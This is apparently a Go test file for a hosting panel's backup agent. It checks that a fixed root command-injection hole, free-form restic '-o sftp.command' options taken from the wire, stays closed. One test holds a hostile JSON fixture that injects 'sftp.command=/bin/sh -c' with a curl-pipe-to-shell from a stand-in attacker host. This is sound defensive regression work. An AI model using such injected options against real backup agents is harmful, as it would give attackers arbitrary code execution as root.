package commands

import (
	"encoding/json"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"git.jabali-panel.com/shukivaknin/jabali2/internal/backup"
)

// TestNoAgentBackupStructAcceptsExtraOptions is the structural half of
// JAB-194, and the one that matters most: it fails if ANY agent request struct
// grows a free-form restic-option field again.
//
// The agent used to take `extra_options []string` off the wire on ten backup
// commands and pass it straight into restic's argv as `-o <opt>`. One of those
// options, `sftp.command`, is the command restic EXECUTES to reach an SFTP
// backend — so any caller that could reach the agent had arbitrary command
// execution as root.
//
// An allowlist of permitted keys cannot fix that: the dangerous key IS the one
// we legitimately use, so any check loose enough to admit
//
//	sftp.command=sshpass -e ssh -o StrictHostKeyChecking=accept-new … -s sftp
//
// admits a hostile value too. The contract changed instead — the agent takes
// typed SFTP fields and builds the option itself — so the correct assertion is
// the ABSENCE of the wire field, not the presence of a filter. A test that
// checked "malicious input is rejected" would pass just as happily against a
// filter that misses one encoding.
func TestNoAgentBackupStructAcceptsExtraOptions(t *testing.T) {
	t.Parallel()

	files, err := filepath.Glob("backup_*.go")
	if err != nil {
		t.Fatalf("glob: %v", err)
	}
	if len(files) == 0 {
		t.Fatal("matched no backup_*.go files — the layout moved and this test is checking nothing")
	}

	// Any json tag that would carry restic option bodies.
	banned := regexp.MustCompile(`json:"(extra_options|restic_options|options)`)
	var offenders []string
	for _, f := range files {
		if strings.HasSuffix(f, "_test.go") {
			continue
		}
		body, err := os.ReadFile(f)
		if err != nil {
			t.Fatalf("read %s: %v", f, err)
		}
		for i, line := range strings.Split(string(body), "\n") {
			if banned.MatchString(line) {
				offenders = append(offenders, f+":"+itoa(i+1)+": "+strings.TrimSpace(line))
			}
		}
	}
	if len(offenders) > 0 {
		t.Errorf("agent backup request struct(s) accept free-form restic options from the wire.\n"+
			"`-o sftp.command=<cmd>` is the command restic EXECUTES for an SFTP backend, so this is "+
			"remote command execution as root, and it cannot be made safe by filtering the value.\n"+
			"Take the typed SFTP fields and let bkResticOptions build the flag (JAB-194).\n  %s",
			strings.Join(offenders, "\n  "))
	}
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b []byte
	for n > 0 {
		b = append([]byte{byte('0' + n%10)}, b...)
		n /= 10
	}
	return string(b)
}

// The agent must produce exactly the option the panel used to send, or SFTP
// destinations with a non-default port/key/password silently stop working
// after the contract change.
func TestBkResticOptionsMatchesSFTPCommandFlag(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct {
		name string
		in   *backupSFTPInputs
	}{
		{"nil means no options", nil},
		{"defaults need no override", &backupSFTPInputs{Host: "h", User: "u", Path: "/p"}},
		{"non-default port", &backupSFTPInputs{Host: "h", User: "u", Path: "/p", Port: 2222}},
		{"key auth", &backupSFTPInputs{Host: "h", User: "u", Path: "/p", Auth: "key", KeyPath: "/root/.ssh/id_ed25519"}},
		{"password auth", &backupSFTPInputs{Host: "h", User: "u", Path: "/p", Auth: "password"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := bkResticOptions(tc.in)
			if tc.in == nil {
				if got != nil {
					t.Fatalf("nil inputs must yield no options, got %q", got)
				}
				return
			}
			want := backup.SFTPCommandFlag(backup.SFTPInputs{
				Host: tc.in.Host, User: tc.in.User, Port: tc.in.Port,
				Path: tc.in.Path, Auth: tc.in.Auth, KeyPath: tc.in.KeyPath,
			})
			if want == "" {
				if got != nil {
					t.Fatalf("no override needed, but got %q", got)
				}
				return
			}
			if len(got) != 1 || got[0] != want {
				t.Fatalf("got %q, want exactly [%q]", got, want)
			}
			if !strings.HasPrefix(got[0], "sftp.command=") {
				t.Errorf("the only option the agent may emit is sftp.command, got %q", got[0])
			}
		})
	}
}

// A request carrying the old field — from a stale panel, or an attacker
// probing the endpoint — must have NO effect on the restic invocation.
func TestWireExtraOptionsAreIgnored(t *testing.T) {
	t.Parallel()

	const hostile = `{
	  "repo_url": "sftp:u@h:/p",
	  "extra_options": ["sftp.command=/bin/sh -c 'curl evil.example/x|sh'"],
	  "sftp": {"host":"h","user":"u","path":"/p","port":2222}
	}`

	var req struct {
		RepoURL string            `json:"repo_url"`
		SFTP    *backupSFTPInputs `json:"sftp,omitempty"`
	}
	if err := json.Unmarshal([]byte(hostile), &req); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	cfg, err := bkResticConfigWithPassword(req.RepoURL, "", "", req.SFTP)
	if err != nil {
		t.Fatalf("config: %v", err)
	}
	for _, opt := range cfg.ExtraOptions {
		if strings.Contains(opt, "curl") || strings.Contains(opt, "evil.example") {
			t.Fatalf("caller-supplied command reached restic's argv: %q", opt)
		}
		if !strings.HasPrefix(opt, "sftp.command=") {
			t.Errorf("unexpected option %q — only agent-built sftp.command is allowed", opt)
		}
	}
	// The typed field still has to work: port 2222 needs an override.
	if len(cfg.ExtraOptions) != 1 {
		t.Fatalf("expected exactly the agent-built option for port 2222, got %q", cfg.ExtraOptions)
	}
	if !strings.Contains(cfg.ExtraOptions[0], "2222") {
		t.Errorf("agent-built option lost the typed port: %q", cfg.ExtraOptions[0])
	}
}
